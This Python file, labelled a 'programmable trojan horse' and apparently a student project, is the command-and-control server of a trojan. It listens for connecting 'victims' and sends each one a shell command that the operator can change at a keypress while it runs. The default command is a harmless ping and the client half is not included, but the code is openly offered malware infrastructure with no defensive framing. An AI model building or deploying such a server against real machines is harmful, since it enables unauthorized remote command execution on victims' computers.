#programmable trojan horse

#Author: Augusto Takashi Fujimaki
#NUSP: 10333716

import selectors
import socket
import threading
from msvcrt import getch


global command
command = 'ping localhost' #defaul command

def thread1():
    global command
    lock = threading.Lock()
    while True:
        with lock:
            key = getch()
            if key == (b'k'):
                print("[Server] Type new command: ", end='')
                command = input()


def accept(sock, mask):
    conn, addr = sock.accept() # Should be ready
    print('[Server] Connected by', addr)
    conn.setblocking(False)
    sel.register(conn, selectors.EVENT_READ, read)

def read(conn, mask):
    global command

    data = conn.recv(1024)
    print(list(data))
    data = data.decode(encoding='ISO-8859-1')
    print('[Client]',data) # Hope it won't block

    if data=='Connected':
        conn.send(command.encode())
        print('[Server] Command sent: ', command)
    else:        
        sel.unregister(conn)
        conn.close()



HOST = 'localhost' # Symbolic name meaning all available interfaces
PORT = 50007 # Arbitrary non-privileged port


sel = selectors.DefaultSelector()
sock = socket.socket()
sock.bind((HOST, PORT))

threading.Thread(target = thread1).start()
print('[Server] Server Started')
print('[Server] Listening For Victim')
print('[Server] Press K to edit the command')
sock.listen(100)
sock.setblocking(False)
sel.register(sock, selectors.EVENT_READ, accept)

while True:
    events = sel.select()
    for key, mask in events:
        callback = key.data
        callback(key.fileobj, mask)
        print('[Server] Press K to edit the command')
